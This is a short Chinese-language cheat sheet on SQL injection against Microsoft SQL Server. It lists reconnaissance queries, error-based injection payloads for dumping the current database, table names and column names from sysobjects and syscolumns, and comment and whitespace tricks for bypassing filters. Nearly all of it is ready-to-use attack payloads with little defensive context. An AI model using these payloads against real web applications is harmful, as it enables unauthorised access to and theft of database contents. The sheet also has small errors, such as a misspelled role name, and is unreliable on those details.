## mssql 注入

### 基础信息查询
查询数据库名称
```
select name from master.dbo.sysdatabases;
```
`master、model、msdb、tempdb`是mssql的默认数据库

查询用户权限
```
select IS_MEMBER('db_owner');
```
服务器角色包含：`sysadmin、serveradmin、securityadmin、processadmin、setupadmin、bulkadmin、diskadmin、dbcreator、public`
数据库角色包含：`db_owner、db_securityadmin、db_accessadmin、db_backupoperator、db_ddladmin、db_datawriter、db_datareader、db_denydatewriter、db_denydatareader`

查询数据库版本
```
select @@version;
```

查询当前数据库名
```
select db_name();
```

查询服务器名称
```
select HOST_NAME();
select @@SERVERNAME;
```

爆当前数据库
```
select * from xxx where id=1 and db_name()>0;
select * from xxx where id=1 and db_name()>'e';
```

爆表名，xx代表表名
```
select * from xxx where id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name='xx');
select * from xxx where id=1 and 'e'<(select top 1 name from sysobjects where xtype='u' and name='xx');
```

爆列名
```
select * from xxx where id=1 and 'b'>(select top 1 name from syscolumns where id=(select id from sysobjects where name='xx') and name<>'id');
```

### Bypass
特殊符号
```
注释: /* */  --
空白符号: /**/
```

mssql对象类型
```
AF = 聚合函数 (CLR)
C = CHECK 约束
D = 默认或默认约束
F = FOREIGN KEY 约束
L = 对数
FN = 标量函数
FS = 装配 (CLR) 标量函数
FT = 装配(CLR) 表值函数
IF = 内联表函数
IT = 内部表
P = 存储过程
PC = 程序集 (CLR) 存储过程
PK = 主键约束（类型为 K）
RF = 复制过滤器存储过程
S =系统表
SN = 同义词
SO = 序列
SQ = 服务队列
TA = 装配 (CLR) DML 触发器
TF = 表函数
TR = SQL DML 触发器
TT = 表类型
U = 用户表
UQ = UNIQUE 约束（类型为 K）
V = 视图
X = 扩展存储过程
```
